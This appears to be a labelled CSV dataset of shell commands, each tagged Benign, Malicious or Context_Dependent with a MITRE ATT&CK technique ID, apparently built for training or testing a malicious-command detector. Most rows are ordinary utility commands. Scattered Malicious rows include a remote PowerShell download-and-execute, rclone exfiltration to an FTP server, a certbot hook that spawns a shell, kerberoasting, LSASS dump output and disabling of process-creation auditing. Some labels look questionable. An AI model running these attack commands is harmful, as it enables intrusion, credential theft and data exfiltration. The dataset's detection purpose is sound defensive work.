command,label,original_label,mitre_id
find -daystart -mtime -7,Benign,Benign,Benign
script path/to/session.out,Benign,Benign,Benign
bcomps -?,Benign,Benign,Benign
cargo info package@version,Benign,Benign,Benign
cpulimit [-l|--limit] 50 [-b|--background] -- program,Benign,Benign,Benign
composer audit vendor/package,Benign,Benign,Benign
gammastep -x,Benign,Benign,Benign
find / -name game,Context_Dependent,Benign,Benign
wait4x tcp localhost:8080 --invert-check,Benign,Benign,Benign
iwconfig,Benign,Benign,Benign
homeshick generate castle_name,Benign,Benign,Benign
git status --branch --porcelain | grep '##' | cut -c 4- | cut -d'.' -f1,Benign,Benign,Benign
hdiutil detach /Volumes/volume_file,Benign,Benign,Benign
mktorrent [-a|--announce] tracker_announce_url [-l|--piece-length] 21 [-o|--output] path/to/example.torrent path/to/file_or_directory,Benign,Benign,Benign
mat2 path/to/file,Benign,Benign,Benign
"cmd.exe /c ""$local_folder\$local_executable"" kerberoast $flags /outfile:""$local_folder\$out_file""",Malicious,Malicious,T1558
crictl rmi image_id1 image_id2 ...,Benign,Benign,Benign
VBoxManage clonevm vm_name --register,Benign,Benign,Benign
cradle sql populate package,Benign,Benign,Benign
valkey-cli -h host,Benign,Benign,Benign
llvm-dis path/to/file.bc,Benign,Benign,Benign
nasm -l list_file source.asm,Benign,Benign,Benign
ykinfo -c,Benign,Benign,Benign
nproc --ignore count,Context_Dependent,Benign,Benign
imp [-i|--initialize],Benign,Benign,Benign
qemu-system-x86_64 [-M|-machine] help,Benign,Benign,Benign
apptainer verify [-g|--group-id] group_id path/to/image.sif,Benign,Benign,Benign
go tool vet help,Benign,Benign,Benign
zgrep [-c|--count] pattern path/to/compressed_file,Benign,Benign,Benign
bing-rewards,Benign,Benign,Benign
find /etc/ -type f -exec ls -s {} + | sort -n | head -3,Benign,Benign,Benign
tmux show-environment -t sessname | grep RBENV,Benign,Benign,Benign
sudo urpme package,Benign,Benign,Benign
goimports path/to/file.go,Benign,Benign,Benign
7zr x path/to/archive.7z,Benign,Benign,Benign
qm [stat|status] --verbose true vm_id,Benign,Benign,Benign
lsb_release -a,Context_Dependent,Synthetic,Synthetic
grant action_list on object_type object_name to role role_name;,Benign,Benign,Benign
find ./ -type f -exec rm -rf {} \;,Benign,Benign,Benign
chown -R antoniod:antoniod /opt/antoniod/,Benign,Benign,Benign
find . \( -name junk -o -name dummy \) -exec rm '{}' \;,Benign,Benign,Benign
salt '*' test.ping,Benign,Benign,Benign
kubeseal --fetch-cert --username username --password password > cert.pem,Benign,Benign,Benign
rake -p '...',Malicious,Malicious,T1548
sudo semanage login [-m|--modify] [-s|--seuser] selinux_user linux_username,Benign,Benign,Benign
diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab,Malicious,Malicious,T1564
xdelta delta path/to/old_file path/to/new_file path/to/patch_file,Benign,Benign,Benign
fprintd-delete username,Benign,Benign,Benign
pacrepairfile --help,Benign,Benign,Benign
/tmp/,Malicious,Malicious,T1564
gemtopnm -version,Benign,Benign,Benign
Get-WUHistory,Benign,Benign,Benign
adscript --target-triple i386-linux-elf --output path/to/file.o path/to/input_file.adscript,Benign,Benign,Benign
df -Ph,Benign,Benign,Benign
bear --output path/to/compile_commands.json -- make,Benign,Benign,Benign
awk -F '\t' '{print $2}' * | sort | uniq -c | sort -nr,Benign,Benign,Benign
mount -t smbfs -o soft //username@server/share /users/username/smb/share,Context_Dependent,Benign,Benign
chflags -R nouchg path/to/directory,Benign,Benign,Benign
filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi,Malicious,Malicious,T1037
radeontop [-t|--ticks] samples_per_second,Benign,Benign,Benign
"diff -q /dir1 /dir2 | grep /dir1 | grep -E ""^Only in*"" | sed -n 's/[^:]*: //p'",Benign,Benign,Benign
bluebuild validate path/to/recipe.yml,Benign,Benign,Benign
taskmgr,Malicious,Malicious,T1036
opt -passname path/to/file.bc -S -o file_opt.bc,Benign,Benign,Benign
tldr pathchk,Benign,Benign,Benign
yacc -d path/to/grammar_file.y -v -b prefix,Benign,Benign,Benign
unopkg gui,Benign,Benign,Benign
cat infile | od -c,Benign,Benign,Benign
"who | awk '{ print $1; }' | sort -u | awk '{print $1; u++} END{ print ""users: "" u}'",Context_Dependent,Benign,Benign
bless --mount /Volumes/Mac OS --setBoot,Benign,Benign,Benign
iwinfo interface assoclist,Benign,Benign,Benign
farge --notify --expire-time 5000,Benign,Benign,Benign
patchwork -T png -O path/to/input.gv,Benign,Benign,Benign
ptyxis [-x|--execute] command,Benign,Benign,Benign
copy /-y path\to\source_file path\to\target_file,Benign,Benign,Benign
nuclei -tl [-pt|-type] dns|file|http|headless|tcp|workflow|ssl|websocket|whois|code|javascript,Benign,Benign,Benign
npm [rb|rebuild] --verbose,Benign,Benign,Benign
Disconnect-ExchangeOnline -Confirm:$false,Malicious,Malicious,T1098
find $dir -type f,Benign,Benign,Benign
"dcode ""NjM3YTQyNzQ1YTQ0NGUzMg==""",Benign,Benign,Benign
audacious [-H|--headless],Benign,Benign,Benign
speedtest [-s|--server-id] server_id,Benign,Benign,Benign
cloud-init query dot_delimited_variable_path,Benign,Benign,Benign
flex analyzer.l,Benign,Benign,Benign
ls /home/ABC/files/*.csv | rev | cut -d/ -f1 | rev,Context_Dependent,Benign,Benign
sudo btrfs [c|check] [-p|--progress] path/to/partition,Benign,Benign,Benign
bloodhound-python --collectionmethod All --username username --hashes LM:NTLM --domain domain,Benign,Benign,Benign
pct [conf|config] 100,Benign,Benign,Benign
find /home -atime +100,Context_Dependent,Benign,Benign
cradle package update package version,Benign,Benign,Benign
gsettings list-recursively org.example.schema,Benign,Benign,Benign
vmtouch path/to/file,Benign,Benign,Benign
sysctl kernel.osrelease,Context_Dependent,Synthetic,Synthetic
jhead path/to/image.jpg,Benign,Benign,Benign
find -name 'messages.*' -exec grep -Iw uint {} + | grep -Ev '.svn|.git|.anythingElseIwannaIgnore',Benign,Benign,Benign
godoc -http=:6060 -index -index_files=path/to/file,Benign,Benign,Benign
Get-AcceptedDomain,Malicious,Malicious,T1482
elasticsearch-users list,Benign,Benign,Benign
"docker [ps|container ls] [-f|--filter] ""status=status""",Benign,Benign,Benign
"Scriptrunner.exe -appvscript ""$payload_path""",Malicious,Malicious,T1202
"C:\\windows\system32\rundll32.exe ""C:\ProgramData\ThumbNail\thumbnail.db""",Malicious,Malicious,T1218
zstd [-d|--decompress] [-c|--stdout] path/to/file.zst,Benign,Benign,Benign
find /media/Movies -type f -mtime -30 -exec ln -s {} /media/Movies/New/ \;,Benign,Benign,Benign
find . -type f -exec grep California {} \; -print,Benign,Benign,Benign
man command,Benign,Benign,Benign
nmap -sS 192.168.1.1,Context_Dependent,Synthetic,Synthetic
netsh advfirewall firewall show rule name=all,Context_Dependent,Malicious,T1016
netsh wlan connect name=SSID,Benign,Benign,Benign
sudo nala upgrade,Benign,Benign,Benign
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.,Malicious,Malicious,T1218
typeinc [-s|--score],Benign,Benign,Benign
rustc [-C|--codegen] lto [-C|--codegen] opt-level=0|1|2|3|s|z path/to/main.rs,Benign,Benign,Benign
devenv up --config path/to/file,Benign,Benign,Benign
RECYCLE.BIN,Malicious,Malicious,T1564
bash-it search alias|plugin|completion,Benign,Benign,Benign
elasticsearch-certutil password --pass password,Benign,Benign,Benign
ipcmk [-M|--shmem] segment_size_in_bytes,Benign,Benign,Benign
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0',Malicious,Malicious,T1059
path/to/cs2 -dedicated +map de_dust2,Benign,Benign,Benign
C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\<filename>.dll,Malicious,Malicious,T1047
xbacklight -set 100 -time 60000 -steps 60,Benign,Benign,Benign
rpm -qa | wc -l,Context_Dependent,Synthetic,Synthetic
read -t5 -n1 -r -p 'Press any key in the next five seconds...' key,Benign,Benign,Benign
git bug push,Benign,Benign,Benign
rabbitmq-streams stream_status stream,Benign,Benign,Benign
gzip [-v|--verbose] path/to/file.gz,Benign,Benign,Benign
find file -prune -cmin +60 -print | grep -q .,Benign,Benign,Benign
"mmv [-a|--append] ""*.txt"" ""all.txt""",Benign,Benign,Benign
"find . -type f -name ""*.txt""",Benign,Benign,Benign
age [-d|--decrypt] [-o|--output] path/to/decrypted_file path/to/encrypted_file.age,Benign,Benign,Benign
find . -type f -perm 755,Benign,Benign,Benign
whereis -s gcc -m git,Context_Dependent,Benign,Benign
smem,Benign,Benign,Benign
rabbitmq-diagnostics listeners,Benign,Benign,Benign
bitcoind,Benign,Benign,Benign
doppler projects delete name|project_id,Benign,Benign,Benign
xsel [-cb|--clear --clipboard],Benign,Benign,Benign
wdctl,Benign,Benign,Benign
find . -name '*-GHBAG-*' -exec rename 's/GHBAG/stream-agg/' {} +,Benign,Benign,Benign
yum --enablerepo=remi install php-mbstring,Benign,Benign,Benign
du -s --block-size=M /path/to/your/directory/,Benign,Benign,Benign
haproxy -c -f path/to/haproxy.cfg,Benign,Benign,Benign
rmlint path/to/backup // path/to/data [-k|--keep-all-tagged] [-m|--must-match-tagged],Benign,Benign,Benign
lsipc --shmems|--queues|--semaphores,Benign,Benign,Benign
GetRegValue,Context_Dependent,Malicious,T1012
"Import-Module ""$ps_module""",Malicious,Malicious,T1048
C:\Users\Public\WinSrcNT\It11.exe,Context_Dependent,Malicious,T1005
sudo yum --releasever=2013.09 update openssl,Benign,Benign,Benign
less -p regex file_name,Benign,Benign,Benign
pnmtotiffcmyk path/to/input_file.pnm > path/to/output_file.tiff,Benign,Benign,Benign
find . -name xxx -exec command {} +,Benign,Benign,Benign
ssh -L 5432:localhost:5432 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
"echo ""a,b""|sed 's/,/\r\n/'",Benign,Benign,Benign
comm -1 -2 <(ls /dir1 | sort) <(ls /dir2 | sort),Benign,Benign,Benign
"false | echo ""${PIPESTATUS[0]}""",Benign,Benign,Benign
vitest,Benign,Benign,Benign
nmap -p 80 10.0.0.100,Context_Dependent,Synthetic,Synthetic
"read -p ""command : "" input_cmd",Benign,Benign,Benign
cryfs path/to/cipher_directory path/to/mount_point,Benign,Benign,Benign
sudo vpnc-disconnect,Benign,Benign,Benign
sfdk emulator install name,Benign,Benign,Benign
syncthing --gui-address ip_address:port|path/to/socket.sock,Benign,Benign,Benign
kubectl debug pod_name [-it|--stdin --tty] --copy-to pod_copy_name --container container_name -- command,Benign,Benign,Benign
7z a path/to/archive.7z path/to/file_or_directory,Benign,Benign,Benign
ytfzf [-m|--audio-only] [-a|--auto-select] [-l|--loop] search_pattern,Benign,Benign,Benign
clementine [-t|--play-pause],Benign,Benign,Benign
mkfile -n 15k path/to/file,Benign,Benign,Benign
swaylock [-f|--daemonize],Benign,Benign,Benign
locale [-a|--all-locales],Benign,Benign,Benign
C:\program files\myapp.exe,Malicious,Malicious,T1574
find . -type f –iname stat*,Benign,Benign,Benign
npm [ln|link],Benign,Benign,Benign
terraform output,Benign,Benign,Benign
find . -print,Benign,Benign,Benign
df --total,Benign,Benign,Benign
sfdk maintain,Benign,Benign,Benign
$HOME/.config/autostart/,Malicious,Malicious,T1547
pastel distinct n,Benign,Benign,Benign
snmpbulkget -v version -c community -O f ip_address oid,Benign,Benign,Benign
wishlist [-c|--config] path/to/config.yaml,Benign,Benign,Benign
ping -c 4 192.168.1.10,Context_Dependent,Synthetic,Synthetic
hyprpm [-f|--force] operation,Benign,Benign,Benign
wfuzz -w path/to/file -p 127.0.0.1:8080:HTTP http://example.com/FUZZ,Benign,Benign,Benign
"exiftool ""-description<=/path/to/input-file --filename /path/to/output-file",Malicious,Malicious,T1222
"varnishlog -q 'ReqURL eq ""/path""'",Benign,Benign,Benign
sudo extrace -u,Benign,Benign,Benign
systemctl service-log-target service_name console,Benign,Benign,Benign
Invoke-ATHHTMLApplication -HTAUri $hta_uri -MSHTAFilePath $mshta_file_path,Malicious,Malicious,T1218
shpool detach session_name,Benign,Benign,Benign
ln -f $GIT_DIR/../apresentacao/apresentacao.pdf $GIT_DIR/../capa/apresentacao.pdf,Benign,Benign,Benign
sudo ip [l|link] [s|set] ethX up|down,Benign,Benign,Benign
pacstrap path/to/new_root base linux linux-firmware,Benign,Benign,Benign
lua,Benign,Benign,Benign
git verify-commit commit_hash1 optional_commit_hash2 ... --raw,Benign,Benign,Benign
mamba create [-n|--name] environment_name python=3.10 matplotlib,Benign,Benign,Benign
net group /domain,Context_Dependent,Malicious,T1069
sc.exe start $service_name,Malicious,Malicious,T1543
yard stats --list-undoc,Benign,Benign,Benign
zip [-d|--delete] path/to/compressed.zip path/to/file_or_directory1 path/to/file_or_directory2 ...,Benign,Benign,Benign
pluma +10 path/to/file,Benign,Benign,Benign
hledger [bs|balancesheet] [-M|--monthly],Benign,Benign,Benign
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f,Malicious,Malicious,T1562
gatsby develop,Benign,Benign,Benign
sudo mknod [-Z|--context] path/to/device_file type major_device_number minor_device_number,Benign,Benign,Benign
pushd %Pathname%,Benign,Benign,Benign
kinfocenter [-h|--help],Benign,Benign,Benign
systemsettings,Benign,Benign,Benign
"touch -m --date=""Wed Jun 12 14:00:00 IDT 2013"" filename",Benign,Benign,Benign
ncu --global,Benign,Benign,Benign
zapier scaffold trigger|search|create|resource noun,Benign,Benign,Benign
pwd | awk -F / '{print $NF}',Benign,Benign,Benign
grub-mount /dev/sdXY /mnt,Benign,Benign,Benign
find . -type f -mtime -7 -print -exec cat {} \; | tar cf - | gzip -9,Benign,Benign,Benign
mount \\computer_name\share_name Z:,Context_Dependent,Benign,Benign
"whiptail --title ""title"" --yes-button ""text"" --no-button ""text"" --yesno ""message"" height_in_chars width_in_chars",Benign,Benign,Benign
du -hsx * | sort -rh | head -10,Benign,Benign,Benign
neofetch --os_arch on|off,Benign,Benign,Benign
sudo loadkeys en|de|fi|dvorak|defkeymap|...,Benign,Benign,Benign
xdg-desktop-menu install --novendor path/to/file.desktop,Benign,Benign,Benign
diff <(sort file1 -u) <(sort file2 -u),Benign,Benign,Benign
"find -name ""*test*"" -depth",Benign,Benign,Benign
puppet [-V|--version],Benign,Benign,Benign
aws lambda list-aliases --function-name name,Benign,Benign,Benign
pngcrush -rem allb -brute -reduce in.png out.png,Benign,Benign,Benign
"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",Malicious,Malicious,T1216
aws acm import-certificate --certificate-arn certificate_arn --certificate certificate --private-key private_key --certificate-chain certificate_chain,Benign,Benign,Benign
gpg-zip [-d|--decrypt] path/to/archive.gpg,Benign,Benign,Benign
Get-Process | Tee-Object -FilePath path\to\file,Benign,Benign,Benign
cd path/to/subdirectory && dvc init --sudir,Benign,Benign,Benign
find . -type f -print | xargs chmod 444,Benign,Benign,Benign
upx --help,Benign,Benign,Benign
aws configure wizard,Benign,Benign,Benign
pip download package,Benign,Benign,Benign
dbus-daemon --syslog,Benign,Benign,Benign
find . \! -name '[A-Z] *' -exec lpr { }\;,Benign,Benign,Benign
takeout start container_id,Benign,Benign,Benign
rustup override set nightly,Benign,Benign,Benign
gh [at|attestation] download path/to/artifact.bin [-R|--repo] owner/repository,Benign,Benign,Benign
find . ! -size 0k,Benign,Benign,Benign
uuidgen [-t|--time],Benign,Benign,Benign
git bundle verify path/to/file.bundle,Benign,Benign,Benign
"echo -n ""yourstring"" |md5sum",Benign,Benign,Benign
tldr factor,Benign,Benign,Benign
"mlr --prepipe 'gunzip' [-c|--csv] filter [-S|--infer-none] '$fieldName =~ ""regex""' example.csv.gz",Benign,Benign,Benign
b2 create_bucket bucket_name allPublic|allPrivate,Benign,Benign,Benign
gcloud auth configure-docker,Benign,Benign,Benign
"find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >> $output_file \;",Context_Dependent,Malicious,T1217
xzdiff --brief path/to/file1 path/to/file2,Benign,Benign,Benign
knife role edit role_name,Benign,Benign,Benign
ss -o state established,Context_Dependent,Synthetic,Synthetic
"echo ""Hello World!"" | sm -",Benign,Benign,Benign
xcv v output_file,Benign,Benign,Benign
imv -t 10 path/to/directory,Benign,Benign,Benign
"ack [-c|--count] [-h|--no-filename] ""search_pattern""",Benign,Benign,Benign
"bind '""\e[24~"":""\C-k \C-upwd\n""'",Benign,Benign,Benign
named,Benign,Benign,Benign
exec 2 | tee ${LOG_FILE},Benign,Benign,Benign
grunt task1 task2 ...,Benign,Benign,Benign
vagrant box add hashicorp/bionic64,Benign,Benign,Benign
"python3 -c ""from base64 import b64decode;dec=b64decode(\""$ENCODED\"");print(dec.decode())""",Malicious,Malicious,T1140
numfmt --from auto 1.5Ki,Benign,Benign,Benign
pct set 100 --hostname new_name,Benign,Benign,Benign
SafeEjectGPU gpuid GPU_ID status,Benign,Benign,Benign
espeak -f path/to/file,Benign,Benign,Benign
schroot --all command,Benign,Benign,Benign
znew -K path/to/file1.Z,Benign,Benign,Benign
"find . ! -name . -prune -exec sh -c 'mv ""$@"" targetdirectory/' sh {} +",Benign,Benign,Benign
pdfattach [-h|--help],Benign,Benign,Benign
"find . -type d -name bin | cut -d/ -f1,2 | sort > b",Benign,Benign,Benign
"find / -type d -iname ""project.images"" -ls",Context_Dependent,Benign,Benign
croc send [-c|--code] passphrase path/to/file_or_directory,Benign,Benign,Benign
snapper [-c|--config] config delete snapshot_number,Benign,Benign,Benign
rletopnm [--a|--alphaout] path/to/alpha_file.pgm path/to/input.rle > path/to/output.pnm,Benign,Benign,Benign
doctl [d|databases] [r|replica] [g|get] database_id replica_name,Benign,Benign,Benign
"Boot, System",Malicious,Malicious,T1485
scanimage [-L|--list-devices],Benign,Benign,Benign
lwp-request -C username:password -m METHOD http://example.com/some/path,Benign,Benign,Benign
sudo tmutil stopbackup,Benign,Benign,Benign
bg % so it wont die when you logoff,Benign,Benign,Benign
find . -name test,Benign,Benign,Benign
tldr [-p|--platform] linux df,Benign,Benign,Benign
pbmtogem [-q|-quiet],Benign,Benign,Benign
sudo removepkg -preserve package_name,Benign,Benign,Benign
cdparanoia 3 'path/to/file.wav',Benign,Benign,Benign
poetry export [-o|--output] requirements.txt --without-hashes,Benign,Benign,Benign
hexedit [-m|--maximize] path/to/file,Benign,Benign,Benign
wmic process call create,Malicious,Malicious,T1047
dd if=/dev/urandom bs=1 count=1 >> $file_to_pad #adds low-quality random data,Malicious,Malicious,T1027
prowler provider --verbose,Benign,Benign,Benign
ldifde.exe -f $output_path\$output_file -p subtree,Context_Dependent,Malicious,T1069
strip path/to/file,Benign,Benign,Benign
find . -type f -exec grep -l 'needle' {} \;,Benign,Benign,Benign
"chatgpt [-p|--prompt] ""What is the regex to match an email address?""",Benign,Benign,Benign
gnome-software --mode updates|updated|installed|overview,Benign,Benign,Benign
terraform apply -target resource_type.resource_name[instance_index],Benign,Benign,Benign
cal,Benign,Benign,Benign
mcfly help subcommand,Benign,Benign,Benign
nb list,Benign,Benign,Benign
cheat [-v|--version],Benign,Benign,Benign
git-sizer -v,Benign,Benign,Benign
xhost -,Benign,Benign,Benign
routel table_number|main|local|default,Benign,Benign,Benign
nagios2 -d,Benign,Benign,Benign
swagger-codegen generate [-i|--input-spec] http://petstore.swagger.io/v2/swagger.json [-l|--lang] java --library retrofit2 -DuseRxJava2=true,Benign,Benign,Benign
trust anchor path/to/certificate.crt,Benign,Benign,Benign
tdf [-f|--fullscreen] path/to/file.pdf,Benign,Benign,Benign
sudo ip [r|route] [a|add] default via ip_address dev ethX,Benign,Benign,Benign
cat /proc/cmdline,Context_Dependent,Synthetic,Synthetic
sngrep -NO path/to/file.pcap,Benign,Benign,Benign
ropper --file path/to/binary --search regex,Benign,Benign,Benign
appman [-r|remove] package,Benign,Benign,Benign
find ./ -type f -ls |grep '10 Sep',Benign,Benign,Benign
mumble mumble://username@example.com,Benign,Benign,Benign
"tea login add --name ""name"" --url ""url"" --token ""token""",Benign,Benign,Benign
mysqldump --user user --password database_name --result-file=path/to/file.sql,Benign,Benign,Benign
pueue edit task_id --path,Benign,Benign,Benign
pdftotext -layout filename.pdf,Benign,Benign,Benign
rankmirrors /etc/pacman.d/mirrorlist,Benign,Benign,Benign
r2e list,Benign,Benign,Benign
git subtree push [-P|--prefix] path/to/directory repository_url branch_name,Benign,Benign,Benign
pake https://www.example.com/,Benign,Benign,Benign
chgrp,Benign,Benign,Benign
systemd-cryptsetup detach mapping_name,Benign,Benign,Benign
"echo ""text"" | espeak-ng",Benign,Benign,Benign
"ssh -n -f user@host ""sh -c 'cd /whereever; nohup ./whatever > /dev/null 2>&1 &'""",Benign,Benign,Benign
msxsl.exe {PATH:.xml} {PATH:.xsl},Malicious,Malicious,T1220
sudo tmutil startbackup,Benign,Benign,Benign
ping -w 1 $c,Benign,Benign,Benign
bun outdated,Benign,Benign,Benign
xcodes runtimes install runtime_name,Benign,Benign,Benign
puppet agent --test,Benign,Benign,Benign
groups,Context_Dependent,Benign,Benign
pulumi import cloudflare:index/workersScript:WorkersScript my_worker_script account_id/script_name,Benign,Benign,Benign
cat $(echo $FILES | sort) | md5sum,Benign,Benign,Benign
"$sheet.Cells.Item(17,1) = ""=FWRITELN(A5, `""oStream.Close`"")""",Malicious,Malicious,T1204
GetNPUsers.py domain/username -hashes LM_Hash:NT_Hash -usersfile path/to/userslist -dc-ip domain_controller_ip,Benign,Benign,Benign
coreutils ls -l,Benign,Benign,Benign
nixos-option [-r|--recursive] users.users.user,Benign,Benign,Benign
mods --help,Benign,Benign,Benign
packer validate path/to/config.json,Benign,Benign,Benign
"reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""",Context_Dependent,Malicious,T1012
"find -iname ""*.jpg""",Benign,Benign,Benign
treetime clock,Benign,Benign,Benign
Get-Command -Type Alias|Cmdlet|Function,Benign,Benign,Benign
crush [-v|--version],Benign,Benign,Benign
"mkdir ""c:\Temp""",Malicious,Malicious,T1105
echo '3' | ajson '2 * pi * $',Benign,Benign,Benign
rustup target remove --toolchain toolchain target,Benign,Benign,Benign
param (,Context_Dependent,Malicious,T1005
jarsigner -verify path/to/file.jar,Benign,Benign,Benign
googler [-w|--site] site keyword,Benign,Benign,Benign
CheckRemoteDebuggerPresent,Context_Dependent,Malicious,T1622
ember test,Benign,Benign,Benign
find dir -depth,Benign,Benign,Benign
pipetron [-vd|--volume-daemon],Benign,Benign,Benign
choice,Benign,Benign,Benign
chkconfig --level 2345 sshd on,Benign,Benign,Benign
"New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView""",Malicious,Malicious,T1562
apx pkgmanagers list,Benign,Benign,Benign
pueue help,Benign,Benign,Benign
find /students -type l -print 2> /dev/null,Benign,Benign,Benign
sudo lvconvert [-m|--mirrors] 0 /dev/vg_name/lv_name,Benign,Benign,Benign
parquet-tools column-index path/to/parquet,Benign,Benign,Benign
ScDeviceEnums,Malicious,Malicious,T1036
kubectl debug pod_name [-it|--stdin --tty] --image busybox,Benign,Benign,Benign
"netsh.exe add helper ""$helper_file""",Malicious,Malicious,T1546
tree -I 'directory_name1|directory_name2',Benign,Benign,Benign
meson install -C path/to/build_directory,Benign,Benign,Benign
cal -m,Benign,Benign,Benign
poetry add package_name==version,Benign,Benign,Benign
dutree --depth depth,Benign,Benign,Benign
test.gif,Malicious,Malicious,T1036
cat ~/.profile,Context_Dependent,Synthetic,Synthetic
sudo timeshift --create,Benign,Benign,Benign
filen sync path/to/local_folder:/remote_folder --continuous,Benign,Benign,Benign
redis-benchmark -q,Benign,Benign,Benign
chafa [-c|--colors] none --symbols braille path/to/file,Benign,Benign,Benign
echo ldapadd -H ldap://$domain.$top_level_domain:389 -x -D $admin_user -w $admin_password -f tempadmin.ldif,Malicious,Malicious,T1136
rsync -avR somedir/./foo/bar/baz.c remote:/tmp/,Benign,Benign,Benign
find -L /home/peter -name *~ -exec rm '{}' \;,Benign,Benign,Benign
"ansible-playbook playbook [-e|--extra-vars] ""variable1=value1 variable2=value2""",Benign,Benign,Benign
whereis scp,Context_Dependent,Synthetic,Synthetic
find . -type f -name \*,Benign,Benign,Benign
git obliterate file_1 file_2 ...,Benign,Benign,Benign
"skate delete ""key""",Benign,Benign,Benign
sudo gitlab-ctl restart nginx,Benign,Benign,Benign
keytool -storepasswd -keystore path/to/file.keystore,Benign,Benign,Benign
yum --enablerepo=remi upgrade php-mbstring,Benign,Benign,Benign
"d8 -e ""code""",Benign,Benign,Benign
mp4decrypt --key track_id:key_hex path/to/input_file.mp4 path/to/output_file.mp4,Benign,Benign,Benign
nmap --script=default 192.168.1.100,Context_Dependent,Synthetic,Synthetic
"local r,x=c:receive();local f=assert(io.popen(r,""r""));",Malicious,Malicious,T1059
sestatus -b,Benign,Benign,Benign
weasyprint path/to/input.html path/to/output.png --stylesheet path/to/stylesheet.css,Benign,Benign,Benign
ico -sleep 0.1,Benign,Benign,Benign
grep -v 'kpt#' data.txt | nl -nln,Benign,Benign,Benign
rar a -ppassword path/to/archive_name.rar path/to/file_or_directory,Benign,Benign,Benign
kubectl set [sa|serviceaccount] [deploy|deployment]/deployment_name service_account_name,Benign,Benign,Benign
watson start project,Benign,Benign,Benign
"find /var/www/html/ -type d -name ""build*"" | sort | tail -n +5 | xargs -I % echo -rf %",Benign,Benign,Benign
"Copy-Item ""$PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll"" C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll",Malicious,Malicious,T1547
&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate,Malicious,Malicious,T1048
"lsns [-o|--output] NS,TYPE,PID,COMMAND",Benign,Benign,Benign
"gawk 'BEGIN {FS="":"";printf ""%-20s %6s %25s\n"", ""Name"", ""UID"", ""Shell""} $4 >= 1000 {printf ""%-20s %6d %25s\n"", $1, $4, $7}' /etc/passwd",Context_Dependent,Benign,Benign
"Write-Host ""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.""",Malicious,Malicious,T1003
vso remove package1 package2 ...,Benign,Benign,Benign
"charm import-keys ""charm-keys-backup.tar""",Benign,Benign,Benign
az login --service-principal [-u|--username] http://azure-cli-service-principal [-p|--password] path/to/cert.pem [-t|--tenant] someone.onmicrosoft.com,Benign,Benign,Benign
"husky set .husky/pre-push ""command command_arguments""",Benign,Benign,Benign
jj config [l|list] --user,Benign,Benign,Benign
supabase status,Benign,Benign,Benign
"System.Console.WriteLine(""tweet, tweet"");",Malicious,Malicious,T1036
"find . -name ""openssl"" 2>/dev/null",Benign,Benign,Benign
sudo log collect --last 1h --output path/to/file.logarchive,Benign,Benign,Benign
GetWindowThreadProcessId,Malicious,Malicious,T1106
lxi discover,Benign,Benign,Benign
zeroclaw daemon,Benign,Benign,Benign
adb shell pm revoke package android.permission.CAMERA|android.permission.ACCESS_FINE_LOCATION|android.permission.READ_CONTACTS|...,Benign,Benign,Benign
getent passwd 1000,Context_Dependent,Benign,Benign
arch-chroot path/to/new_root,Context_Dependent,Benign,Benign
"openai api completions.create --model ada --prompt ""Hello world""",Benign,Benign,Benign
slurmdbd -V,Benign,Benign,Benign
"onionsearch ""string"" --engines tor66|deeplink|phobos|...",Benign,Benign,Benign
c99 file.c file.o,Benign,Benign,Benign
sctasks,Malicious,Malicious,T1053
instaloader [-l|--login] username [-p|--password] password profile_name,Benign,Benign,Benign
